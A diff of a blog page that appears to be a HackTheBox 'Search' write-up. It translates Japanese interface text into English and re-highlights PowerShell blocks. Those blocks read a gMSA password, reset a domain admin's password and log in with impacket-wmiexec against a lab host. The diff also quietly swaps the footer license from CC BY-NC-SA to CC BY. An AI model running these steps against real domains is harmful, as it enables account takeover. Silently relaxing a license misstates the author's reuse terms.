@@ -167,7 +167,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -482,7 +482,7 @@
 <ul>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password</a></li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">'BIR-ADFS-GMSA$'</span></span><br><span class="line"><span class="variable">$gmsa</span> = Get-ADServiceAccount -Identity <span class="variable">$user</span> -Properties <span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$blob</span> = <span class="variable">$gmsa</span>.<span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$mp</span> = ConvertFrom-ADManagedPasswordBlob <span class="variable">$blob</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$user</span>,<span class="variable">$mp</span>.SecureCurrentPassword</span><br><span class="line"><span class="built_in">Invoke-Command</span> -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">'BIR-ADFS-GMSA$'</span></span><br><span class="line"><span class="variable">$gmsa</span> = <span class="built_in">Get-ADServiceAccount</span> <span class="literal">-Identity</span> <span class="variable">$user</span> <span class="literal">-Properties</span> <span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$blob</span> = <span class="variable">$gmsa</span>.<span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$mp</span> = <span class="built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="variable">$blob</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$user</span>,<span class="variable">$mp</span>.SecureCurrentPassword</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -494,7 +494,7 @@
 
 <h1 id="Domain-Admin-amp-root-txt"><a href="#Domain-Admin-amp-root-txt" class="headerlink" title="Domain Admin &amp; root.txt"></a>Domain Admin &amp; root.txt</h1><p>BIR-ADFS-GMSA对Tristan.Davies有Generic all权限，而Tristan.Davies是domain admin：</p>
 <p>所以可以直接修改Tristan.Davies的密码后登录</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;net user Tristan.Davies miao@<span class="number">1234</span> /domain&#125;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec -dc-ip <span class="number">10.10</span>.<span class="number">11.129</span> search.htb/Tristan.Davies@<span class="number">10.10</span>.<span class="number">11.129</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123;net user Tristan.Davies miao@<span class="number">1234</span> /domain&#125;</span><br><span class="line"></span><br><span class="line">impacket<span class="literal">-wmiexec</span> <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">11.129</span> search.htb/Tristan.Davies@<span class="number">10.10</span>.<span class="number">11.129</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -538,7 +538,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2022-05-05T08:31:22.909Z" itemprop="dateUpdated">2022-05-05 16:31:22</time>
+    Last updated: <time datetime="2022-05-05T08:31:22.909Z" itemprop="dateUpdated">2022-05-05 16:31:22</time>
 </span><br>
 
 
@@ -705,7 +705,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
